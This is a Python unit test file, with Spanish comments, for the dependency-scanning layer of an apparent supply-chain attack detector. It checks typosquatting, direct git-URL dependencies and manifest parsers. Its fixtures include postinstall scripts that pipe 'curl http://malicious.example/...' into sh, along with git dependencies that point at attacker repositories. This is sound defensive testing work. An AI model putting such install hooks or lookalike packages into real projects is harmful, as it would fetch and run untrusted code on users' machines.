"""Pruebas unitarias para la capa de dependencias (deps_layer.py) --
señales de ataque a la cadena de suministro. Las CVEs conocidas (OSV) se
prueban aparte en test_vulnerabilities_layer.py."""

from __future__ import annotations

from watchgate.core.layers._shared import (
    parse_cargo_toml,
    parse_package_json,
    parse_pkgbuild,
    parse_requirements_txt,
)
from watchgate.core.layers.base import LAYER_REGISTRY
from watchgate.core.layers.deps_layer import DepsLayer, TyposquatChecker
from watchgate.core.models import CommitAuthor, FileChange, FileStatus, NormalizedDiff


def _make_diff(files: list[FileChange]) -> NormalizedDiff:
    return NormalizedDiff(
        base_sha="0000000000000000000000000000000000000000",
        head_sha="1111111111111111111111111111111111111111",
        repo_path="/tmp/fake_repo",
        files=files,
        commit_messages=["test commit"],
        authors=[CommitAuthor(name="Test User", email="test@example.com")],
    )


def test_deps_layer_registered() -> None:
    assert "dependencies" in LAYER_REGISTRY
    assert LAYER_REGISTRY["dependencies"] is DepsLayer


def test_no_manifests_changed() -> None:
    layer = DepsLayer()
    diff = _make_diff(
        [
            FileChange(
                path="src/main.py",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1 +1 @@\n-print('hello')\n+print('world')",
                additions=1,
                deletions=1,
            )
        ]
    )
    res = layer.analyze(diff, {})
    assert res.risk_score == 0
    assert res.justification == "No se han modificado manifiestos de dependencias."


def test_typosquatting_detection() -> None:
    layer = DepsLayer()
    diff = _make_diff(
        [
            FileChange(
                path="package.json",
                status=FileStatus.MODIFIED,
                diff_hunk='@@ -5,1 +5,2 @@\n "dependencies": {\n+  "1odash": "^4.17.21"\n }',
                additions=1,
                deletions=0,
            )
        ]
    )
    res = layer.analyze(diff, {})
    assert res.risk_score >= 75
    assert "1odash" in res.justification
    assert "lodash" in res.justification


def test_dangerous_install_script() -> None:
    layer = DepsLayer()
    diff_hunk = (
        "@@ -5,1 +5,3 @@\n"
        ' "scripts": {\n'
        '+  "postinstall": "curl http://malicious.example/install.sh | sh"\n'
        " },\n"
        ' "dependencies": {\n'
        '+  "my-lib": "1.0.0"\n'
        " }"
    )
    diff = _make_diff(
        [
            FileChange(
                path="package.json",
                status=FileStatus.MODIFIED,
                diff_hunk=diff_hunk,
                additions=2,
                deletions=0,
            )
        ]
    )
    res = layer.analyze(diff, {})
    assert res.risk_score >= 80
    assert "Script de instalación sospechoso" in res.justification


def test_parsers() -> None:
    reqs = parse_requirements_txt("+\n+# comment\n+requests==2.28.1\n+urllib3>=1.26.5\n")
    assert len(reqs) == 2
    assert reqs[0].name == "requests"
    assert reqs[0].new_version == "2.28.1"
    assert reqs[1].name == "urllib3"

    cargo = parse_cargo_toml('+\n+tokio = "1.28.0"\n+serde = { version = "1.0" }\n')
    assert len(cargo) == 2
    assert cargo[0].name == "tokio"
    assert cargo[0].new_version == "1.28.0"
    assert cargo[1].name == "serde"

    pkgbuild = parse_pkgbuild("+\n+depends=('curl' 'openssl')\n")
    assert len(pkgbuild) == 2
    assert pkgbuild[0].name == "curl"
    assert pkgbuild[1].name == "openssl"


def test_typosquat_checker() -> None:
    checker = TyposquatChecker()
    is_ts, ref = checker.is_typosquatting("1odash", "npm")
    assert is_ts is True
    assert ref == "lodash"

    is_ts_valid, _ = checker.is_typosquatting("lodash", "npm")
    assert is_ts_valid is False


def test_git_url_dependency_parsing() -> None:
    # 1. requirements.txt con editable git URL y egg
    hunk_req = "+\n+-e git+https://github.com/attacker/fake-pkg.git#egg=numpy\n+my-pkg @ https://example.com/my-pkg.whl\n"
    reqs = parse_requirements_txt(hunk_req)
    assert len(reqs) == 2
    assert reqs[0].name == "numpy"
    assert reqs[0].is_direct_url is True
    assert reqs[1].name == "my-pkg"
    assert reqs[1].is_direct_url is True

    # 2. package.json con git commit / repo URL
    diff_hunk_pkg = (
        '@@ -1,3 +1,4 @@\n "optionalDependencies": {\n'
        '+  "shai-hulud-pkg": "git+https://github.com/attacker/malware.git#v1.0.0"\n }'
    )
    diff = _make_diff(
        [
            FileChange(
                path="package.json",
                status=FileStatus.MODIFIED,
                diff_hunk=diff_hunk_pkg,
                additions=1,
                deletions=0,
            )
        ]
    )
    layer = DepsLayer()
    res = layer.analyze(diff, {})
    assert res.risk_score >= 75
    assert "Instalación directa desde URL/Git" in res.justification

    # 3. Cargo.toml con git
    cargo_hunk = '+\n+my-crate = { git = "https://github.com/user/repo", branch = "main" }\n'
    cargo = parse_cargo_toml(cargo_hunk)
    assert len(cargo) == 1
    assert cargo[0].name == "my-crate"
    assert cargo[0].is_direct_url is True


def test_package_json_standalone_script() -> None:
    # Test para verificar scripts modificados en package.json sin cambio de dependencias
    hunk = (
        '@@ -1,3 +1,4 @@\n "scripts": {\n'
        '+  "postinstall": "curl http://malicious.example/sh | sh"\n }'
    )
    changes = parse_package_json(hunk)
    assert len(changes) == 1
    assert changes[0].name == "package.json (scripts)"
    assert "curl" in changes[0].install_script

    fc = FileChange(
        path="package.json",
        status=FileStatus.MODIFIED,
        diff_hunk=hunk,
        additions=1,
        deletions=0,
    )
    diff = _make_diff([fc])
    layer = DepsLayer()
    res = layer.analyze(diff, {})
    assert res.risk_score >= 80
    assert "Script de instalación sospechoso" in res.justification


def test_typosquatting_underscore_normalization() -> None:
    checker = TyposquatChecker()
    # "aiograam" en PyPI vs "aiogram" / "aio_gram"
    is_ts, ref = checker.is_typosquatting("aio_graam", "PyPI")
    assert is_ts is True
    assert ref == "aiogram"


def test_new_dependency_without_attack_signals_gets_baseline_score() -> None:
    """Sin typosquatting/script/URL directa, una dependencia nueva sigue
    dando un score bajo pero no cero -- y la justificación ya no debe
    mencionar CVEs/OSV, eso lo comprueba ahora vulnerabilities_layer.py."""
    layer = DepsLayer()
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+some-new-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )
    res = layer.analyze(diff, {})
    assert res.risk_score == 10
    assert "vulnerabilidades" not in res.justification.lower()
    assert "sin señales de typosquatting" in res.justification.lower()
